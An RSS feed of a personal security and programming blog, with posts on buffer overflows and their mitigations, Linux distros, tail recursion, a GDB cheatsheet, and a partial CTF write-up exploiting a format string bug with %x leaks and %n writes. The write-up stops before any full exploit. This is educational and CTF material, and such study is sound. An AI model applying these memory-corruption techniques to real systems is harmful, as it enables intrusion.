<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Yusuf Hegazy</title>
        <link>https://yusufhegazy.github.io/posts/</link>
        <description>Recent content in Posts on Yusuf Hegazy</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Mon, 30 Nov 2020 02:46:12 +0200</lastBuildDate>
        <atom:link href="https://yusufhegazy.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Buffer Overflows for Normies</title>
            <link>https://yusufhegazy.github.io/posts/bof-for-normies/</link>
            <pubDate>Mon, 30 Nov 2020 02:46:12 +0200</pubDate>
            
            <guid>https://yusufhegazy.github.io/posts/bof-for-normies/</guid>
            <description>What is a Buffer anyway? We can think of buffers as containers to hold our data for later use, It&amp;rsquo;s not really something specific to computer science; in fact, we have buffers in electronics, mechanics, chemistry and even politics! We can say that the word buffer is just a fancy name for a placeholder (temporary storage)!
Buffer in Computer Science Now, it&amp;rsquo;s time to get more technical and get to know buffers more in computer science!</description>
            <content type="html"><![CDATA[
    <img src="/img/bof-normies/header.png"  alt="Fractal Tree"  class="center"  style="border-radius: 8px;"  />


<h2 id="what-is-a-buffer-anyway">What is a Buffer anyway?</h2>
<p>We can think of buffers as containers to hold our data for later use, It&rsquo;s not really something specific to computer science; in fact, we have buffers in electronics, mechanics, chemistry and even politics!
We can say that the word buffer is just a fancy name for a placeholder (temporary storage)!</p>
<h2 id="buffer-in-computer-science">Buffer in Computer Science</h2>
<p>Now, it&rsquo;s time to get more technical and get to know buffers more in computer science!</p>
<p>Online video streaming is a pretty good application of buffering, back in the old days we would see YouTube showing that nostalgic loading bar while waiting the video to load and that&rsquo;s exactly why we use buffers!
we need to store video data in someplace so that when we need that data we can load it directly from the computer&rsquo;s memory since we can&rsquo;t really have our internet connection playback videos in Realtime without having some temporarily storage for data to reside in, and that&rsquo;s the reason why livestreams never sync with Realtime and have a couple seconds delay.</p>
<p>here is a more lower level representation of a buffer:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define BUFSIZE 1024
</span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> buffer[BUFSIZE];
size_t len;

<span style="color:#75715e">// ... later
</span><span style="color:#75715e"></span><span style="color:#66d9ef">while</span>((len<span style="color:#f92672">=</span>read(STDIN, <span style="color:#f92672">&amp;</span>buffer, BUFSIZE)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
    write(STDOUT, buffer, len);
</code></pre></div><p>and this snippet basically check for data available then reads it from the standard input (command line) and writes that data back to the standard output (command line too).</p>
<h2 id="buffer-overflows">Buffer Overflows!</h2>
<p>It&rsquo;s time for the good stuff now!</p>
<p>Let&rsquo;s say we have an arbitrary variable of size 5 bytes, and we stored some value in that variable which <em>exceeds 5 bytes</em>, that&rsquo;s a simple buffer overflow!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">char</span> someVariable[<span style="color:#ae81ff">5</span>];
memcpy(someVariable, <span style="color:#e6db74">&#34;Hello, world!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">15</span>); <span style="color:#75715e">/* we are trying to copy 15 bytes to a 5 bytes sized variable */</span>
printf(someVariable);
</code></pre></div><p>we encounter buffer overflows more frequently than we imagine, ever seen <code>Segmentation Fault</code> appear in your C program out of nowhere? that&rsquo;s also a buffer overflow but your computer has prevented it from causing any damage and stopped the program from running.</p>
<p>Let&rsquo;s get back to our 5 bytes overflown variable example. what happens to the overflown data? where is it&rsquo;s destination? does it get lost in the void of nothingness?</p>
<p>nope, in fact we just overwrite other data when we overflow any variable, and that&rsquo;s the core of our problem. we can&rsquo;t just overwrite data and act as if nothing happened, what if we overwrite important data? what if we can overwrite data related to process memory and already running programs? these are all possibilities which are just a mere consequence of buffer overflows and can cause great damage to computers</p>
<h2 id="weaponizing-buffer-overflows">Weaponizing Buffer Overflows</h2>
<p>A basic technique used by hackers when exploiting buffer overflow vulnerabilities is determining the place where data gets overwritten and <strong>handcrafting</strong> the overflown data to inject <strong>arbitrary code</strong> in the program, imagine if that program runs at elevated privileges and a hacker takes control of it&rsquo;s execution flow, you get <em>pwned.</em></p>
<p>and that&rsquo;s just the basic technique in abusing buffer overflow vulnerabilities.</p>
<h2 id="am-i-really-safe">Am I Really Safe?</h2>
<p>Sadly, yes you are safe.</p>
<p>buffer overflows aren&rsquo;t as popular in 2020 (as of writing this article) as they used to be back in the old days of computers, all modern processors/operating systems have strict rules and mitigations for all the paradigms and techniques of buffer overflows.</p>
<p>some of these famous mitigations are:</p>
<ul>
<li>
<p><strong>ASLR</strong> (Address Space Layout Randomization)</p>
<p>which basically randomizes all the memory addresses at runtime whenever you execute any program so it makes it impossible to hardcode memory addresses for exploiting buffer overflow attacks</p>
<p>i.e: the exploit needs to be completely dynamic</p>
</li>
<li>
<p><strong>NX Bit</strong></p>
<p>basically marks areas of memory as non-executable, prevents hackers from injecting malicious code into areas of memory in an attempt to execute it.</p>
</li>
<li>
<p><strong>Stack Canaries</strong></p>
<p>basically generates some random value in memory at runtime and checks before returning from any function if that random value got overwritten or not, if yes then program exits.</p>
</li>
</ul>
<p>and these are just some of the basic mitigation used in 2020.</p>
<p>but again, <em>these doesn&rsquo;t really make your computer invincible</em> as much as making it just harder for an attacker to compromise your system using buffer overflow attacks.</p>
<p>hackers still can bypass these mitigations using underhanded methods such as bruteforce and leaking addresses from memory but using these mitigations correctly can make buffer overflows nearly useless.</p>
<p>It&rsquo;s also worthy to note that buffer overflows can be prevented from the programmers side by following the coding best practices and avoiding unsanitized input etc&hellip;</p>
]]></content>
        </item>
        
        <item>
            <title>My Favorite Linux Distro</title>
            <link>https://yusufhegazy.github.io/posts/distro/</link>
            <pubDate>Sun, 27 Sep 2020 23:27:38 +0200</pubDate>
            
            <guid>https://yusufhegazy.github.io/posts/distro/</guid>
            <description>To Linux or not to Linux Since a couple months ago, i have decided to try and switch fully to linux and ditch that piece of junk they call windows.
Now, that&amp;rsquo;s a bit misleading since i have been using windows for the past 12-13 years of my keyboard smashing journey but i don&amp;rsquo;t really feel any guilt doing this, in fact windows is nothing more of a bottleneck to me or so have i figured later.</description>
            <content type="html"><![CDATA[<h2 id="to-linux-or-not-to-linux">To Linux or not to Linux</h2>
<p>Since a couple months ago, i have decided to try and switch fully to linux and ditch that piece of junk they call windows.</p>
<p>Now, that&rsquo;s a bit misleading since i have been using windows for the past 12-13 years of my keyboard smashing journey but i don&rsquo;t really feel any guilt doing this, in fact windows is nothing more of a bottleneck to me <em>or so have i figured later</em>.</p>
<p>enough ranting, maybe this needs it&rsquo;s own blog post after all <em>or maybe not</em>, it&rsquo;s a highly controversial topic whatsoever. Just believe me windows is pure evil.</p>
<h2 id="settling-on-an-os">Settling on an OS</h2>
<p>I have tried tons of Linux distrois but i always kept jumping from one to the next, never settled on a distro, at first i wanted to use it mainly for my cybersecurity hobby so i thought Kali would be a pretty nice choice&hellip;</p>
<p>but guess what, it wasn&rsquo;t&hellip;</p>
<p>I really think that kali is a pretty good OS but not that good for using as a daily driver system, it&rsquo;s just bloated with a tons of security tools that you will never get chance to use and maybe you don&rsquo;t even know of their existence.</p>
<p>so i started trying different operating systems ranging from the classic debian to using arch linux which actually was the thing i liked the most!</p>
<h2 id="why-arch">Why Arch</h2>
<p>beside the fact that you get to customize your operating system to the max level, you also get the Arch User Repository (AUR) which contains 64,441 packages as of writing this, it&rsquo;s a rolling release distro which basically gives you gradual little updates as they are released unlike other stable release distro that give you a bulky big update that sometimes forces you to reinstall your os.</p>
<p>Arch is a bit tougher than any other OS though, since they don&rsquo;t provide any graphical installer like most distros and you have to configure it yourself from the groundup, a pretty awesome arch based distro is <strong>Manjaro</strong> which is bascially a simpified version of arch with all Arch&rsquo;s perks and that&rsquo;s what i have setteled on!</p>
<h2 id="manjaro-for-cybersecurity">Manjaro for Cybersecurity</h2>
<p>So we now have an arch distro that is lightweigt, fully customizable and contains an awesome package manager with the arch user repositoty, and that&rsquo;s not even the end! we can add to our manjaro setup <a href="https://blackarch.org/downloads.html#install-repo">the blackarch repo</a> which contains as of writing this article a whooping 7030 security tool ready for installing at your fingertips!</p>
<p>now we can customize our own distro and bundle it with the tools we only need!</p>
<h2 id="the-skys-your-limit">The Sky&rsquo;s your limit</h2>
<p>Manjaro comes in differnt desktop enviroments, but i have actually tried all of them inclduing XFCE, KDE and MATE and the one that sucked the least was XFCE&hellip;</p>
<p>but that was until i discovered the heaven of tiling window managers, which basically can speed up your keyboard smashing habits by 10x if you invested the little time into making it your own!</p>
<p>here are some pics of my Manjaro boxes!</p>
<p>
    <img src="/img/distro/screenie1.png"  alt="Fractal Tree"  class="center"  style="border-radius: 8px;"  />


<a href="https://www.reddit.com/r/unixporn/comments/irhskz/i3_the_arctic/">config</a></p>
<p>
    <img src="/img/distro/screenie2.jpeg"  alt="Fractal Tree"  class="center"  style="border-radius: 8px;"  />


<a href="https://www.reddit.com/r/unixporn/comments/ixexgc/i3gaps_someone_paid_my_bail_so_now_we_have/">config</a></p>
]]></content>
        </item>
        
        <item>
            <title>Optimizing Recursion</title>
            <link>https://yusufhegazy.github.io/posts/lets-talk-recursion/</link>
            <pubDate>Thu, 24 Sep 2020 15:52:30 +0200</pubDate>
            
            <guid>https://yusufhegazy.github.io/posts/lets-talk-recursion/</guid>
            <description>Recursion is a pretty improtant topic in programming and it&amp;rsquo;s not that hard to grasp or even implement, but how about actually using it correctly?
In this blog post i will try to explain the basic concept of recursion and then show why recursion can be so inefficient and how to optimize it using Call Tail Optimization!
Normal Recursion, A Factorial Example Most of us tech nerds have already dealt with the good &amp;lsquo;ol recursion, let&amp;rsquo;s refresh our understanding using the iconic factorial program.</description>
            <content type="html"><![CDATA[
    <img src="/img/recursion/recursion.png"  alt="Fractal Tree"  class="center"  style="border-radius: 8px;"  />


<p>Recursion is a pretty improtant topic in programming and it&rsquo;s not that hard to grasp or even implement, but how about <strong>actually using it correctly?</strong></p>
<p>In this blog post i will try to explain the basic concept of recursion and then show why recursion can be so inefficient and how to optimize it using <strong>Call Tail Optimization!</strong></p>
<h2 id="normal-recursion-a-factorial-example">Normal Recursion, A Factorial Example</h2>
<p>Most of us tech nerds have already dealt with the good &lsquo;ol recursion, let&rsquo;s refresh our understanding using the iconic factorial program.
$$0! = 1$$
$$n! = n (n-1)!$$
Python Implementation:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fact</span>(x):
	<span style="color:#66d9ef">if</span> (x<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>):
		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
	<span style="color:#66d9ef">else</span>:
		<span style="color:#66d9ef">return</span> x <span style="color:#f92672">*</span> fact(x<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</code></pre></div><p><em>But python is just too mainstream and overrated, let&rsquo;s use Lisp!</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Scheme" data-lang="Scheme">(<span style="color:#66d9ef">define </span>(<span style="color:#a6e22e">fact</span> x)
  (<span style="color:#66d9ef">if </span>(= x <span style="color:#ae81ff">0</span>)
      <span style="color:#ae81ff">1</span>
	  (* x (<span style="color:#a6e22e">fact</span> (- x <span style="color:#ae81ff">1</span>)))))
</code></pre></div><p>ain&rsquo;t Scheme just too beautiful?
Now, let&rsquo;s inspect the program behavior!</p>
<h2 id="tracing-the-recursion">Tracing The Recursion</h2>
<p>let&rsquo;s say we want to execute <code>(fact 5)</code> which supposedly evaluates to 120.
here is the trace of the factorial operation:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Scheme" data-lang="Scheme">(<span style="color:#a6e22e">fact</span> <span style="color:#ae81ff">5</span>)
(* <span style="color:#ae81ff">5</span> (<span style="color:#a6e22e">fact</span> <span style="color:#ae81ff">4</span>))
(* <span style="color:#ae81ff">5</span> (* <span style="color:#ae81ff">4</span> (<span style="color:#a6e22e">fact</span> <span style="color:#ae81ff">3</span>)))
(* <span style="color:#ae81ff">5</span> (* <span style="color:#ae81ff">4</span> (* <span style="color:#ae81ff">3</span> (<span style="color:#a6e22e">fact</span> <span style="color:#ae81ff">2</span>))))
(* <span style="color:#ae81ff">5</span> (* <span style="color:#ae81ff">4</span> (* <span style="color:#ae81ff">3</span> (* <span style="color:#ae81ff">2</span> (<span style="color:#a6e22e">fact</span> <span style="color:#ae81ff">1</span>)))))
(* <span style="color:#ae81ff">5</span> (* <span style="color:#ae81ff">4</span> (* <span style="color:#ae81ff">3</span> (* <span style="color:#ae81ff">2</span> (* <span style="color:#ae81ff">1</span> (<span style="color:#a6e22e">fact</span> <span style="color:#ae81ff">0</span>))))))
(* <span style="color:#ae81ff">5</span> (* <span style="color:#ae81ff">4</span> (* <span style="color:#ae81ff">3</span> (* <span style="color:#ae81ff">2</span> (* <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span>)))))
(* <span style="color:#ae81ff">5</span> (* <span style="color:#ae81ff">4</span> (* <span style="color:#ae81ff">3</span> (* <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">1</span>))))
(* <span style="color:#ae81ff">5</span> (* <span style="color:#ae81ff">4</span> (* <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2</span>)))
(* <span style="color:#ae81ff">5</span> (* <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">6</span>))
(* <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">24</span>)
<span style="color:#ae81ff">120</span>
</code></pre></div><p>here&rsquo;s the pythonic version for those who are struggling with lisp (it&rsquo;s way easier believe me)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">fact(<span style="color:#ae81ff">5</span>)
<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> fact(<span style="color:#ae81ff">4</span>)
<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> fact(<span style="color:#ae81ff">3</span>))
<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> fact(<span style="color:#ae81ff">2</span>)))
<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> fact(<span style="color:#ae81ff">1</span>))))
<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> fact(<span style="color:#ae81ff">0</span>)))))
<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span>))))
<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span>)))
<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>))
<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">6</span>)
<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span>
<span style="color:#ae81ff">120</span>
</code></pre></div><p>Did you figure out the flaw of our simple recursion implementation yet?</p>
<p>It&rsquo;s pretty simple, the way we expand the factorial on each iteration so that it grows and keeps growing until we fully expand it is just so inefficient and wastes memory space.</p>
<p>The waste of memory space comes from the fact that each call of <code>(fact x)</code> will allocate a new stack frame to store its data, so we have used around 6 stack frames for this simple calculation, allocating and popping stack frames is a relatively intensive operation for the CPU.</p>
<p>The source of this flaw is the multiplication that we are performing with our recurred call.</p>
<p>So Tail Call Optimization or Tail Recursion are just fancy names for a simple rule we need to follow in order to optimize our recursive functions.</p>
<p><em>&ldquo;The recurred call shouldn&rsquo;t be combined with other operations&rdquo;</em></p>
<p>i.e: we need to move the multiplication operator out of the recurred call in the factorial function</p>
<h2 id="using-tail-recursion">Using Tail Recursion</h2>
<p>let&rsquo;s rewrite the factorial function in Tail Recursion:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Scheme" data-lang="Scheme">(<span style="color:#66d9ef">define </span>(<span style="color:#a6e22e">fact-tail</span> x accum)
  (<span style="color:#66d9ef">if </span>(= x <span style="color:#ae81ff">0</span>) accum 
  (<span style="color:#a6e22e">fact-tail</span> (- x <span style="color:#ae81ff">1</span>) (* x accum))))

(<span style="color:#66d9ef">define </span>(<span style="color:#a6e22e">fact</span> x) (<span style="color:#a6e22e">fact-tail</span> x <span style="color:#ae81ff">1</span>))
</code></pre></div><h3 id="pythonic-version">Pythonic version:</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">factTail</span>(x, accum):
	<span style="color:#66d9ef">if</span> (x <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>):
		<span style="color:#66d9ef">return</span> accum
	<span style="color:#66d9ef">else</span>:
		<span style="color:#66d9ef">return</span> factTail(x<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, x<span style="color:#f92672">*</span>accum)
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fact</span>(x):
	<span style="color:#66d9ef">return</span> factTail(x, <span style="color:#ae81ff">1</span>)
</code></pre></div><p>what we did in that snippet above is pretty simple, we just split the work across two functions, the first function <code>(fact-tail x accum)</code> will iterate and the second function <code>(fact x)</code> will call the first function and returns the value of each iteration (we have also moved the multiplication operation to it&rsquo;s own variable) so we basically have no extra operations going on, <em>in fact calling <code>(fact 0)</code> is now the same as calling <code>(fact 10000)</code> in terms of memory size.</em></p>
<p>let&rsquo;s step through each iteration and see for ourselves how great is Tail Recursion:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Scheme" data-lang="Scheme">(<span style="color:#a6e22e">fact</span> <span style="color:#ae81ff">5</span>)
(<span style="color:#a6e22e">fact-tail</span> <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">1</span>)
(<span style="color:#a6e22e">fact-tail</span> <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">5</span>)
(<span style="color:#a6e22e">fact-tail</span> <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">20</span>)
(<span style="color:#a6e22e">fact-tail</span> <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">60</span>)
(<span style="color:#a6e22e">fact-tail</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">120</span>)
(<span style="color:#a6e22e">fact-tail</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">120</span>)
<span style="color:#ae81ff">120</span>
</code></pre></div><p>Pythonic Version:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">fact(<span style="color:#ae81ff">5</span>)
factTail(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">1</span>)
factTail(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>)
factTail(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">20</span>)
factTail(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">60</span>)
factTail(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">120</span>)
factTail(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">120</span>)
</code></pre></div><p>is this even recursion anymore, that&rsquo;s just <strong>fancy iteration!</strong></p>
<p>we have used recursion in such a way that we store all the data to perform our evalutaion in each individual reccured call!
All Hail Tail Call Optimization!</p>
<h2 id="more-tail-recursion">More Tail Recursion!</h2>
<p>here is one more example with the infamous fibonacci function in both normal Recursion and then Tail Recursion:</p>
<p><em>(you try to implement it in python this time :p)</em></p>
<h3 id="normal-recursion">Normal Recursion</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Scheme" data-lang="Scheme">(<span style="color:#66d9ef">define </span>(<span style="color:#a6e22e">fib</span> x)
  (<span style="color:#66d9ef">cond </span>((= x <span style="color:#ae81ff">0</span>) <span style="color:#ae81ff">0</span>)
  		((= x <span style="color:#ae81ff">1</span>) <span style="color:#ae81ff">1</span>)
  		(<span style="color:#66d9ef">else </span>(+ (<span style="color:#a6e22e">fib</span> (- x <span style="color:#ae81ff">1</span>)) (<span style="color:#a6e22e">fib</span> (- x <span style="color:#ae81ff">2</span>))))))
</code></pre></div><h3 id="tail-recursion">Tail Recursion</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Scheme" data-lang="Scheme">(<span style="color:#66d9ef">define </span>(<span style="color:#a6e22e">fib</span> x)
    (<span style="color:#a6e22e">fib-iter</span> x <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">1</span>))

(<span style="color:#66d9ef">define </span>(<span style="color:#a6e22e">fib-iter</span> x a b)
    (<span style="color:#66d9ef">cond </span>((= x <span style="color:#ae81ff">0</span>) a)
    ((= x <span style="color:#ae81ff">1</span>) b)
    (<span style="color:#66d9ef">else </span>(<span style="color:#a6e22e">fib-iter</span> (- x <span style="color:#ae81ff">1</span>) b (+ a b)))))
</code></pre></div><p><em>All Hail The Tail Recursion</em></p>
]]></content>
        </item>
        
        <item>
            <title>GDB Cheatsheet</title>
            <link>https://yusufhegazy.github.io/posts/gdb-cheatsheet/</link>
            <pubDate>Tue, 18 Aug 2020 13:56:57 +0000</pubDate>
            
            <guid>https://yusufhegazy.github.io/posts/gdb-cheatsheet/</guid>
            <description>Data:
 disas main to disassemble function x/50wx $esp examine 50 words in hex starting from esp x/50i $eip examine 50 instructions from eip x anything examine address and show it’s contents info variables varname will show any variable address (for global!) info functions to list all functions info frame shows the saved RTN address under &amp;ldquo;saved eip&amp;rdquo; info proc map shows memory map ctx shows general info about everything (works in gef only)    Flow</description>
            <content type="html"><![CDATA[<ul>
<li>
<p>Data:</p>
<ul>
<li><code>disas main</code> to disassemble function</li>
<li><code>x/50wx $esp</code> e<strong>x</strong>amine 50 <strong>w</strong>ords in <strong>h</strong>ex starting from <strong>esp</strong></li>
<li><code>x/50i $eip</code> examine 50 instructions from eip</li>
<li><code>x anything</code> examine address and show it’s contents</li>
<li><code>info variables varname</code> will show any variable address (for global!)</li>
<li><code>info functions</code> to list all functions</li>
<li><code>info frame</code> shows the saved RTN address under &ldquo;saved eip&rdquo;</li>
<li><code>info proc map</code> shows memory map</li>
<li><code>ctx</code> shows general info about everything <em>(works in gef only)</em></li>
</ul>
</li>
<li>
<p>Flow</p>
<ul>
<li><code>b *address</code> or <code>b *function&lt;+number&gt;</code></li>
<li><code>j *address</code> <em>to jump</em></li>
<li><code>si</code> <strong>s</strong>tep <strong>i</strong>nstruction</li>
<li><code>ni</code> step instruction and stepover functions</li>
</ul>
</li>
<li>
<p>Hook Stops
we use these to execute certain commands everytime our program flow stops (ex: breakpoints, steps)</p>
<ul>
<li>to define a hook stop we run the following:</li>
</ul>
</li>
</ul>
<pre><code>define hook-stop
&gt;info registers
&gt;x/24wx $esp
&gt;x/2i $eip
&gt;end
</code></pre>]]></content>
        </item>
        
        <item>
            <title>Not Really AI (Pwn - 200 Points)</title>
            <link>https://yusufhegazy.github.io/posts/ctf-writeup/</link>
            <pubDate>Tue, 09 Jun 2020 17:49:21 +0000</pubDate>
            
            <guid>https://yusufhegazy.github.io/posts/ctf-writeup/</guid>
            <description>Little Background This is a Binary exploitaion challenge, based around a format string vulnerability.
 Misusage of the libc printf() function can lead to serious information leakage and even code execution. when we pass one argument (for example printf(foo)) we can:  leak stack addresses using %x or %p format specifiers. overwrite any pointer&amp;rsquo;s value using %n specifier (note that we can&amp;rsquo;t overwrite plain stack addresses as the %n format specifier can only overwrite by reference and not by value)    For more information on format strings please check this awesome resource</description>
            <content type="html"><![CDATA[<h2 id="little-background">Little Background</h2>
<p>This is a Binary exploitaion challenge, based around a format string vulnerability.</p>
<ul>
<li>Misusage of the libc <code>printf()</code> function can lead to serious information leakage and even code execution.</li>
<li>when we pass one argument (for example <code>printf(foo)</code>) we can:
<ul>
<li>leak stack addresses using <code>%x</code> or <code>%p</code> format specifiers.</li>
<li>overwrite any pointer&rsquo;s value using <code>%n</code> specifier (note that we can&rsquo;t overwrite plain stack addresses as the %n format specifier can only overwrite by reference and not by value)</li>
</ul>
</li>
</ul>
<p>For more information on format strings please check <a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf">this awesome resource</a></p>
<h2 id="analyzing-the-binary">Analyzing the Binary</h2>
<p>we fire up GDB and list all our functions:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  info functions       
All defined functions: 
Non<span style="color:#f92672">-</span>debugging symbols:
<span style="color:#ae81ff">0x08049000</span>  _init
<span style="color:#ae81ff">0x08049030</span>  printf<span style="color:#960050;background-color:#1e0010">@</span>plt
<span style="color:#ae81ff">0x08049040</span>  fgets<span style="color:#960050;background-color:#1e0010">@</span>plt
<span style="color:#ae81ff">0x08049050</span>  getegid<span style="color:#960050;background-color:#1e0010">@</span>plt
<span style="color:#ae81ff">0x08049060</span>  puts<span style="color:#960050;background-color:#1e0010">@</span>plt
<span style="color:#ae81ff">0x08049070</span>  system<span style="color:#960050;background-color:#1e0010">@</span>plt
<span style="color:#ae81ff">0x08049080</span>  __libc_start_main<span style="color:#960050;background-color:#1e0010">@</span>plt
<span style="color:#ae81ff">0x08049090</span>  setvbuf<span style="color:#960050;background-color:#1e0010">@</span>plt
<span style="color:#ae81ff">0x080490a0</span>  setresgid<span style="color:#960050;background-color:#1e0010">@</span>plt
<span style="color:#ae81ff">0x080490b0</span>  _start
<span style="color:#ae81ff">0x080490f0</span>  _dl_relocate_static_pie
<span style="color:#ae81ff">0x08049100</span>  __x86.get_pc_thunk.bx
<span style="color:#ae81ff">0x08049110</span>  deregister_tm_clones
<span style="color:#ae81ff">0x08049150</span>  register_tm_clones
<span style="color:#ae81ff">0x08049190</span>  __do_global_dtors_aux
<span style="color:#ae81ff">0x080491c0</span>  frame_dummy
<span style="color:#ae81ff">0x080491c2</span>  response
<span style="color:#ae81ff">0x08049245</span>  flaggy
<span style="color:#ae81ff">0x08049270</span>  main
<span style="color:#ae81ff">0x080492eb</span>  __x86.get_pc_thunk.ax
<span style="color:#ae81ff">0x080492f0</span>  __libc_csu_init
<span style="color:#ae81ff">0x08049350</span>  __libc_csu_fini
<span style="color:#ae81ff">0x08049351</span>  __x86.get_pc_thunk.bp
<span style="color:#ae81ff">0x08049358</span>  _fini
</code></pre></div><p>we notice three non-standard functions above which are:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ae81ff">0x080491c2</span>  response
<span style="color:#ae81ff">0x08049245</span>  flaggy
<span style="color:#ae81ff">0x08049270</span>  main
</code></pre></div><p>by inspecting the disassembly for these three functions we find out that:</p>
<ul>
<li>main function will call response function</li>
<li>response function maybe vulnerable to a format string vulnerability (since there is a printf call)</li>
<li>the flaggy function is a dead code, our goal is to call it.</li>
</ul>
<p>so let&rsquo;s start by running some input on the binary, let&rsquo;s test with a couple of <code>%x</code>'s:</p>
<pre><code>hegz@hegzbox:~/ractf/Not_Really_AI$ ./nra
How are you finding RACTF?
%x %x %x %x    
I am glad you
200 f7fb9580 80491d1 25207825

We hope you keep going!
</code></pre><p>bingo!
we can leak stack addresses.</p>
<h2 id="exploitation">Exploitation</h2>
<p>since this binary is vulnerable to a format strings attack, we can use the <code>%n</code> specifer to overwrite any pointer value on the stack.
But can we really overwrite the return address?
The answer is No, we can&rsquo;t do that since it is not a pointer, it&rsquo;s a value and we can&rsquo;t overwrite values on the stack using <code>%n</code></p>
